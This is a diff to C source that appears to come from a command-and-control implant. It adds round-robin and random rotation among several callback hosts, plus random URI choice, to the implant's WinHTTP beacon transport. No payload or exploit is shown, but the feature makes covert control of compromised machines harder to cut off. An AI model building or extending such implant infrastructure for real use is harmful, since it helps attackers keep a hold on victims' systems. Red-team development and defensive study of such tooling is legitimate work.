@@ -202,13 +202,14 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
     HANDLE  hSession        = NULL;
     HANDLE  hRequest        = NULL;
 
+    LPWSTR  HttpHost        = NULL;
     LPWSTR  HttpHeader      = NULL;
     LPWSTR  HttpEndpoint    = NULL;
     DWORD   HttpFlags       = 0;
     DWORD   HttpAccessType  = 0;
     LPCWSTR HttpProxy       = NULL;
 
-    DWORD   UrisCounter     = 0;
+    DWORD   Counter         = 0;
     DWORD   Iterator        = 0;
     DWORD   BufRead         = 0;
     UCHAR   Buffer[ 1024 ]  = { 0 };
@@ -231,7 +232,30 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
         goto LEAVE;
     }
 
-    hConnect = Instance->Win32.WinHttpConnect( hSession, Instance->Config.Transport.Host, Instance->Config.Transport.Port, 0 );
+    if ( Instance->Config.Transport.HostRotation == TRANSPORT_HTTP_ROTATION_ROUND_ROBIN )
+    {
+        HttpHost = Instance->Config.Transport.Hosts[ Instance->Config.Transport.HostIndex ];
+        if ( HttpHost )
+            Instance->Config.Transport.HostIndex++;
+        else
+        {
+            // We hit the last item which is a NULL. means we have to start all over from 0.
+            Instance->Config.Transport.HostIndex = 0;
+            HttpHost = Instance->Config.Transport.Hosts[ Instance->Config.Transport.HostIndex ];
+        }
+    }
+    else if ( Instance->Config.Transport.HostRotation == TRANSPORT_HTTP_ROTATION_RANDOM )
+    {
+        while ( TRUE )
+        {
+            if ( ! Instance->Config.Transport.Hosts[ Counter ] ) break;
+            else Counter++;
+        }
+
+        HttpHost = Instance->Config.Transport.Hosts[ RandomNumber32() % Counter ];
+    }
+
+    hConnect = Instance->Win32.WinHttpConnect( hSession, HttpHost, Instance->Config.Transport.Port, 0 );
     if ( ! hConnect )
     {
         PRINTF( "WinHttpConnect: Failed => %d\n", NtGetLastError() )
@@ -240,15 +264,14 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
         goto LEAVE;
     }
 
+    Counter = 0;
     while ( TRUE )
     {
-        if ( ! Instance->Config.Transport.Uris[ UrisCounter ] )
-            break;
-        else
-            UrisCounter++;
+        if ( ! Instance->Config.Transport.Uris[ Counter ] ) break;
+        else Counter++;
     }
 
-    HttpEndpoint = Instance->Config.Transport.Uris[ RandomNumber32() % UrisCounter ];
+    HttpEndpoint = Instance->Config.Transport.Uris[ RandomNumber32() % Counter ];
     HttpFlags    = WINHTTP_FLAG_BYPASS_PROXY_CACHE;
 
     if ( Instance->Config.Transport.Secure )
